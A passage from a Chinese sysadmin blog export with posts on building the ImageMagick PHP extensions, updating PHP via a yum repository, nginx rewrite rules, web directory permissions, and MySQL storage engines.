<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; imagemagick是一个开源的强大的适用于图形图像开发制作的软件套件，与GD库同等级别的，甚至有些功能是GD所没有的，比如创建动态的gif图 片。它基于命令行操作的，但同时为大量的其它编程语言提供了接口。详细请访问官方网站是<a href="http://www.imagemagick.org" target="_blank" rel="external">http://www.imagemagick.org</a><br>本文主要介绍imagemagick为php语言提供的两个扩展imagick和MagickWand for PHP的安装。IMagick 已经被php最新的版本选为内部的扩展函数库，php的手册已经有了函数说明使用文档。这个扩展是可选安装的。<br>imagemagick有两款接口，分别是 MagickWand API&#160; 和MagickCore API。MagickCore API 是全面的底层的接口，比较适合高水平的程序员，而MagickWand API&#160; 是官方推荐的精选的重要的一些接口。IMagick和MagickWand for PHP就是分别为这两款接口而准备的。<br><strong>下载地址</strong> ：<br>ImageMagick 6.3.6-10&#160; <a href="http://sourceforge.net/projects/ImageMagick" target="_blank" rel="external">http://sourceforge.net/projects/ImageMagick</a><br>IMagick&#160; <a href="http://pecl.php.net/package/imagick" target="_blank" rel="external">http://pecl.php.net/package/imagick</a><br>MagickWand For PHP&#160;&#160; <a href="http://www.magickwand.org/" target="_blank" rel="external">http://www.magickwand.org/</a><br><strong>安装</strong> ：<br>无论是安装IMagick或者是MagickWand For PHP都需要先安装ImageMagick。<br>1.<strong>安装ImageMagick</strong></p>
<p>$tar xzvf ImageMagick-6.3.6-10.tar.gz<br>$cd ImageMagick-6.3.6<br>$./configure<br>$make<br>$make install</p>
<p>服务器如果没有安装Jpeg v6b、libPng、FreeType 的要在安装imagemagick之前先装好，否则imagemagick没法读取jpeg和png图片，字体文件也读不了。下面是安装 Imagemagick时./configure的结果，可以查看imagickMagick是否支持哪些格式的图片以及一些环境配置：</p>
<p>Host system type : i686-pc-linux-gnu   </p>
<h2 id="Option-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-Value"><a href="#Option-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-160-Value" class="headerlink" title="Option&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Value    "></a>Option&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Value    </h2><p>Shared libraries&#160; –enable-shared=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; yes<br>Static libraries&#160; –enable-static=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; yes<br>Module support&#160;&#160;&#160; –with-modules=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; yes<br>GNU ld&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-gnu-ld=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; yes<br>Quantum depth&#160;&#160;&#160;&#160; –with-quantum-depth=16&#160;&#160;&#160;&#160;&#160;&#160; 16<br>High Dynamic Range Imagery<br>–enable-hdri=no&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>Delegate Configuration:<br>BZLIB&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-bzlib=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; yes<br>DJVU&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-djvu=no&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>DPS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-dps=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>FlashPIX&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-fpx=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>FontConfig&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-fontconfig=no&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>FreeType&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-freetype=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; yes(支持)<br>GhostPCL&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; None&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; pcl6 (unknown)<br>Ghostscript&#160;&#160;&#160;&#160;&#160;&#160; None&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; gs (7.07)<br>result_ghostscript_font_dir=’none’<br>Ghostscript fonts –with-gs-font-dir=default<br>Ghostscript lib&#160;&#160; –with-gslib=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no (failed tests)<br>Graphviz&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-gvc=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>JBIG&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-jbig=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>JPEG v1&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-jpeg=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; yes(支持)<br>JPEG-2000&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-jp2=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>LCMS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-lcms=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>Magick++&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-magick-plus-plus=yes&#160;&#160; yes<br>OpenEXR&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-openexr=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>PERL&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-perl=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; /usr/bin/perl<br>PNG&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-png=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; yes(支持)<br>RSVG&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-rsvg=no&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>TIFF&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-tiff=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>result_windows_font_dir=’none’<br>Windows fonts&#160;&#160;&#160;&#160; –with-windows-font-dir=<br>WMF&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-wmf=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>X11&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-x=&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>XML&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-xml=no&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; no<br>ZLIB&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –with-zlib=yes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; yes<br>X11 Configuration:<br>X_CFLAGS&#160;&#160;&#160;&#160;&#160;&#160;&#160; =<br>X_PRE_LIBS&#160;&#160;&#160;&#160;&#160; =<br>X_LIBS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; =<br>X_EXTRA_LIBS&#160;&#160;&#160; =<br>Options used to compile and link:<br>PREFIX&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; = /usr/local<br>EXEC-PREFIX&#160;&#160;&#160;&#160; = /usr/local<br>VERSION&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; = 6.3.6<br>CC&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; = gcc<br>CFLAGS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; = -g -O2 -Wall -W -pthread<br>MAGICK_CFLAGS&#160;&#160; = -g -O2 -Wall -W -pthread<br>CPPFLAGS&#160;&#160;&#160;&#160;&#160;&#160;&#160; = -I/usr/local/include<br>PCFLAGS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; =<br>DEFS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; = -DHAVE_CONFIG_H<br>LDFLAGS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; =<br>MAGICK_LDFLAGS&#160; = -L/usr/local/lib<br>LIBS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; = -lMagick -ljpeg -lbz2 -lz -lm -lpthread<br>CXX&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; = g++<br>CXXFLAGS&#160;&#160;&#160;&#160;&#160;&#160;&#160; = -g -O2 -Wall -W -pthread</p>
<p>2.<strong>安装Imagick</strong><br>我们采用不需要php源代码的方法，即不需要重新编译php，直接将Imagick源码编译成so扩展。</p>
<p>$tar xzvf imagick-2.0.1.tgz<br>$cd imagick-2.0.1<br>$phpize (此命令前提是你已经安装了php,phpize可以通过whereis命令查找出具体路径)<br>$./configure<br>$make<br>$make install</p>
<p>安装完成后系统会产生一个imagick.so文件，并提示路径如下<br>Installing shared extensions:&#160;&#160;&#160;&#160; /usr/local/lib/php/extensions/no-debug-non-zts-20060613/<br>这个动态文件可以给相同的php环境使用，比如我直接将imagick.so复制到/opt/lampp/lib/php/exention /extension/no-debug-non-zts-20060613/下，xampp环境就可以使用这个动态扩展了，非常方便；<br>最后一步需要在php.ini加入extension=imagick.so这行，重启apache.安装完毕。<br>如果想编译成php的一个静态模块，方法：</p>
<p>$tar xzvf&#160; imagick-2.0.1.tgz $PHP_SOURCE_DIR/ext/imagick<br>$rm configure &amp;&amp; ./buildconf –force<br>$./configure (重新编译php，在你其它选项最后加上) –with-imagick<br>$make &amp;&amp; make install</p>
<p>3.<strong>安装magickwand</strong><br>我们采用跟imagick相同的方法：</p>
<p>$tar xzvf MagickWandForPHP-1.0.5.tar.gz<br>$cd MagickWandForPHP-1.0.5<br>$phpize (此命令前提是你已经安装了php,phpize可以通过whereis命令查找出具体路径)<br>$./configure<br>$make<br>$make install</p>
<p>安装完成后系统会产生一个magickwand.so文件，并提示路径如下<br>Installing shared extensions:&#160;&#160;&#160;&#160; /usr/local/lib/php/extensions/no-debug-non-zts-20060613/<br>最后一步需要在php.ini加入extension=magickwand.so这行，重启apache.安装完毕。<br>如果想编译成php静态模块:<br>PHP_SRC_DIR代表机器上的php源代码路径，例如/root/php-5.2.2</p>
<p>$tar xzvf MagickWandForPHP-1.0.5.tar.gz PHP_SRC_DIR/ext/magickwand/<br>$cd PHP_SRC_DIR/ext/magickwand/<br>$phpize (此命令前提是你已经安装了php,phpize可以通过whereis命令查找出具体路径)<br>$cd PHP_SRC_DIR<br>$rm ./configure<br>$./buildconf –force<br>$./configure (重新编译php，在你其它选项最后加上) –with-magickwand=/usr</p>
<p>最后通过phpinfo去查看安装是否成功,关于使用待续。</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[yum更新php版本]]></title>
      <url>/2012/04/27/yum-e6-9b-b4-e6-96-b0php-e7-89-88-e6-9c-ac.html</url>
      <content type="html"><![CDATA[<p>&#160;</p>
<p>yum源配置：</p>
<p>[utterramblings]<br>name=Jason’s Utter Ramblings Repo<br>baseurl=<a href="http://www.jasonlitka.com/media/EL$releasever/$basearch/" target="_blank" rel="external">http://www.jasonlitka.com/media/EL$releasever/$basearch/</a><br>enabled=1<br>gpgcheck=1<br>gpgkey=<a href="http://www.jasonlitka.com/media/RPM-GPG-KEY-jlitka" target="_blank" rel="external">http://www.jasonlitka.com/media/RPM-GPG-KEY-jlitka</a></p>
<p>保存。</p>
<p>再次运行下面的命令就可以完成php的升级了</p>
<p>#yum update php</p>
<p>同理，运行下面命令，升级mysql</p>
<p>#yum update mysql</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Nginx常见的几种rewrite规则]]></title>
      <url>/2012/04/26/nginx-e5-b8-b8-e8-a7-81-e7-9a-84-e5-87-a0-e7-a7-8drewrite-e8-a7-84-e5-88-99.html</url>
      <content type="html"><![CDATA[<p><strong>静态地址重定向到带参数的动态地址</strong><br>rewrite &quot;^(.<em>)/service/(.</em>).html$&quot; $1/service.php?sid=$2 permanent;<br><strong>带参数的动态地址重定向到静态地址</strong><br>if ($query_string ~<em> id=(.</em>)) {<br>&#160;&#160;&#160; set $id $1;<br>&#160;&#160;&#160; rewrite &quot;^(.*)/article.asp$&quot; $1/article/$id.htm last;<br>}</p>
<p><strong>泛域名解析     
</strong><br>server_name www.w3cgroup.com *.w3cgroup.com;<br>server_name_in_redirect off;    </p>
<p>#设置默认root<br>set $rootdir /usr/local/nginx/html/w3cgroup/;    </p>
<p>#匹配三级域名<br>if ($host ~<em> ^([^.]+).([^.]+).([^.]+).([^.]+)$) {<br>&#160;&#160;&#160; set $rootdir /usr/local/nginx/html/w3cgroup/$2/$1;<br>&#160;&#160;&#160; #三级域名中有访问指定的目录则重定向到相应的二级域名下<br>&#160;&#160;&#160; rewrite &quot;^.+upload/?(.</em>)$&quot; <a href="http://upload.w3cgroup.com/$1" target="_blank" rel="external">http://upload.w3cgroup.com/$1</a> permanent;<br>&#160;&#160;&#160; rewrite &quot;^.+ijc/?(.*)$&quot; <a href="http://ijc.w3cgroup.com/$1" target="_blank" rel="external">http://ijc.w3cgroup.com/$1</a> permanent;<br>&#160;&#160;&#160; break;<br>}    </p>
<p>#匹配二级域名<br>if ($host ~* ^([^.]+).([^.]+).([^.]+)$) {<br>&#160;&#160;&#160; set $rs1 $1;<br>}    </p>
<p>#设置www时root<br>if ($rs1 ~<em> ^www$) {<br>&#160;&#160;&#160; set $rootdir /usr/local/nginx/html/platform_ig/;<br>&#160;&#160;&#160; #二级域名中有访问指定的目录则重定向到相应的二级域名下,注意，这里要使用last<br>&#160;&#160;&#160; rewrite &quot;^.+upload/?(.</em>)$&quot; upload/$1 last;<br>&#160;&#160;&#160; rewrite &quot;^.+ijc/?(.*)$&quot; ijc/$1 last;<br>&#160;&#160;&#160; break;<br>}    </p>
<p>#设置非www二级域名时root<br>if ($rs1 !~<em> ^www$) {<br>&#160;&#160;&#160; set $rootdir /usr/local/nginx/html/w3cgroup/$rs1;<br>&#160;&#160;&#160; #二级域名中有访问指定的目录则重定向到相应的二级域名下<br>&#160;&#160;&#160; rewrite &quot;^.+upload/?(.</em>)$&quot; <a href="http://upload.w3cgroup.com/$1" target="_blank" rel="external">http://upload.w3cgroup.com/$1</a> permanent;<br>&#160;&#160;&#160; rewrite &quot;^.+ijc/?(.*)$&quot; <a href="http://ijc.w3cgroup.com/$1" target="_blank" rel="external">http://ijc.w3cgroup.com/$1</a> permanent;<br>&#160;&#160;&#160; break;<br>}    </p>
<p>#应用root<br>root $rootdir;<br>index index.php index.html;<br>error_page 404 <a href="http://$host/" target="_blank" rel="external">http://$host/</a>;</p>
<p><strong>注意：if () {} 之间需要空格，否则Nginx.conf会报unknow directive 错误!</strong></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> rewrite </tag>
            
            <tag> Nginx重定向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux下Web目录和文件安全权限设置]]></title>
      <url>/2012/04/24/linux-e6-9c-8d-e5-8a-a1-e5-99-a8-e7-b3-bb-e7-bb-9f-e5-8f-82-e6-95-b0-e4-bc-98-e5-8c-96.html</url>
      <content type="html"><![CDATA[<p>在Linux下，web目录和文件权限必须从整体上考虑系统的安全。一般情况下，对目录，需要设置 r(读取)和x(执行)权限，有的目录同时还需要w(写入权限)；对文件，需要r(读取)，有的文件需要w(写入)权限或x(执行)权限。</p>
<p>在Linux系统中，使用命令umask设置创建文件或目录的默认rwx权限，系统默认的umask设置是022，这个权限的计算相当于文件、目录权限的掩码，例如此时创建的目录权限755 (rwxr-xr-x)，那么其umask权限相当于相对777的掩码022；而此时创建的文件权限为644 (rw-r–r–)，其umask权限相当于相对666的掩码022。</p>
<p>当然，这样的权限设置很不安全，同一台server上的不同用户(可能相同也可能不同用户组)/虚拟主机用户能够互相窥探到对方的源码，umask值必须修改的比较严格，以使得除root权限之外，不能随意互相窥探其他人的源码、数据库资料等。</p>
<p>设置方法是：去掉同用户组和其他用户组的r(读取)权限，具体做法是设置目录权限为500(读取+执行)同时文件权限为400(读取)，此时umask应设置为277，设置目录权限为700(读取+写入+执行)同时文件权限为500(读取+执行)，此时umask应设置为177。</p>
<p>例如对于后者，我们可以使用命令 umask 177设置当前对话下的默认目录、文件创建权限，如果要永久设置，就要修改/root/.bash_profile以及所有用户home的录下的.bash_profile文件，将其中的 umask 022改为 umask 177。</p>
<p>从以上可以看出，如果要设置较为安全的目录、文件权限，几个基本原则就是：</p>
<p><font face="Courier New"></font><br><code>&lt;font face=&quot;微软雅黑&quot;&gt;1、尽可能减少web路径下可写入目录的数量。 &lt;/font&gt;</code></p>
<p><code>&lt;font face=&quot;微软雅黑&quot;&gt;2、文件的写入和执行权限只能选择其一，避免同时出现写入和执行权限。&lt;/font&gt;</code></p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web目录安全 </tag>
            
            <tag> 权限 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mysql常见存储引擎介绍]]></title>
      <url>/2012/04/24/mysql-e5-b8-b8-e8-a7-81-e5-ad-98-e5-82-a8-e5-bc-95-e6-93-8e-e4-bb-8b-e7-bb-8d.html</url>
      <content type="html"><![CDATA[<p>MySQL有多种存储引擎，每种存储引擎有各自的优缺点，同学们可以择优选择使用：</p>
<p>MyISAM、InnoDB、MERGE、MEMORY(HEAP)、BDB(BerkeleyDB)、EXAMPLE、FEDERATED、ARCHIVE、CSV、BLACKHOLE。</p>
<p>MySQL支持数个存储引擎作为对不同表的类型的处理器。MySQL存储引擎包括处理事务安全表的引擎和处理非事务安全表的引擎：</p>
<p>· MyISAM管理非事务表。它提供高速存储和检索，以及全文搜索能力。MyISAM在所有MySQL配置里被支持，它是默认的存储引擎，除非你配置MySQL默认使用另外一个引擎。</p>
<p>· MEMORY存储引擎提供“内存中”表。MERGE存储引擎允许集合将被处理同样的MyISAM表作为一个单独的表。就像MyISAM一样，MEMORY和MERGE存储引擎处理非事务表，这两个引擎也都被默认包含在MySQL中。</p>
<p>注释：MEMORY存储引擎正式地被确定为HEAP引擎。</p>
<p>· InnoDB和BDB存储引擎提供事务安全表。BDB被包含在为支持它的操作系统发布的MySQL-Max二进制分发版里。InnoDB也默认被包括在所 有MySQL 5.1二进制分发版里，你可以按照喜好通过配置MySQL来允许或禁止任一引擎。</p>
<p>· EXAMPLE存储引擎是一个“存根”引擎，它不做什么。你可以用这个引擎创建表，但没有数据被存储于其中或从其中检索。这个引擎的目的是服务，在 MySQL源代码中的一个例子，它演示说明如何开始编写新存储引擎。同样，它的主要兴趣是对开发者。</p>
<p>· NDB Cluster是被MySQL Cluster用来实现分割到多台计算机上的表的存储引擎。它在MySQL-Max 5.1二进制分发版里提供。这个存储引擎当前只被Linux, Solaris, 和Mac OS X 支持。在未来的MySQL分发版中，我们想要添加其它平台对这个引擎的支持，包括Windows。</p>
<p>· ARCHIVE存储引擎被用来无索引地，非常小地覆盖存储的大量数据。</p>
<p>· CSV存储引擎把数据以逗号分隔的格式存储在文本文件中。</p>
<p>· BLACKHOLE存储引擎接受但不存储数据，并且检索总是返回一个空集。</p>
<p>· FEDERATED存储引擎把数据存在远程数据库中。在MySQL 5.1中，它只和MySQL一起工作，使用MySQL C Client API。在未来的分发版中，我们想要让它使用其它驱动器或客户端连接方法连接到另外的数据源。</p>
<p>当你创建一个新表的时候，你可以通过添加一个ENGINE 或TYPE 选项到CREATE TABLE语句来告诉MySQL你要创建什么类型的表：</p>
<p>CREATE TABLE t (i INT) ENGINE = INNODB;</p>
<p>CREATE TABLE t (i INT) TYPE = MEMORY;</p>
<p>虽然TYPE仍然在MySQL 5.1中被支持，现在ENGINE是首选的术语。</p>
<p>如何选择最适合你的存储引擎呢？</p>
<p>下述存储引擎是最常用的：</p>
<p>· MyISAM：默认的MySQL插件式存储引擎，它是在Web、数据仓储和其他应用环境下最常使用的存储引擎之一。注意，通过更改STORAGE_ENGINE配置变量，能够方便地更改MySQL服务器的默认存储引擎。</p>
<p>· InnoDB：用于事务处理应用程序，具有众多特性，包括ACID事务支持。</p>
<p>· BDB：可替代InnoDB的事务引擎，支持COMMIT、ROLLBACK和其他事务特性。</p>
<p>· Memory：将所有数据保存在RAM中，在需要快速查找引用和其他类似数据的环境下，可提供极快的访问。</p>
<p>· Merge：允许MySQL DBA或开发人员将一系列等同的MyISAM表以逻辑方式组合在一起，并作为1个对象引用它们。对于诸如数据仓储等VLDB环境十分适合。</p>
<p>· Archive：为大量很少引用的历史、归档、或安全审计信息的存储和检索提供了完美的解决方案。</p>
<p>· Federated：能够将多个分离的MySQL服务器链接起来，从多个物理服务器创建一个逻辑数据库。十分适合于分布式环境或数据集市环境。</p>
<p>· Cluster/NDB：MySQL的簇式数据库引擎，尤其适合于具有高性能查找要求的应用程序，这类查找需求还要求具有最高的正常工作时间和可用性。</p>
<p>· Other：其他存储引擎包括CSV（引用由逗号隔开的用作数据库表的文件），Blackhole（用于临时禁止对数据库的应用程序输入），以及Example引擎（可为快速创建定制的插件式存储引擎提供帮助）。</p>
<p>请记住，对于整个服务器或方案，你并不一定要使用相同的存储引擎，你可以为方案中的每个表使用不同的存储引擎，这点很重要。<br>mysql&gt; show engines;<br>+——————–+————+———————————————–———————-—————————–+<br>| Engine&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | Support&#160;&#160;&#160; | Comment |<br>+——————–+————+———————————————————–———————-——————+<br>| MyISAM&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | DEFAULT | Default engine as of MySQL 3.23 with great performance&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; |<br>| MEMORY&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | YES&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | Hash based, stored in memory, useful for temporary tables&#160;&#160;&#160;&#160;&#160;&#160; |<br>| InnoDB&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | YES&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | Supports transactions, row-level locking, and foreign keys&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; |<br>| BerkeleyDB&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | NO&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | Supports transactions and page-level locking&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; |<br>| BLACKHOLE&#160;&#160;&#160;&#160;&#160;&#160; | NO&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | /dev/null storage engine (anything you write to it disappears) |<br>| EXAMPLE&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | NO&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | Example storage engine&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; |<br>| ARCHIVE&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | NO&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | Archive storage engine&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; |<br>| CSV&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | NO&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | CSV storage engine&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; |<br>| ndbcluster&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | NO&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | Clustered, fault-tolerant, memory-based tables&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; |<br>| FEDERATED&#160;&#160;&#160;&#160;&#160;&#160;&#160; | NO&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | Federated MySQL storage 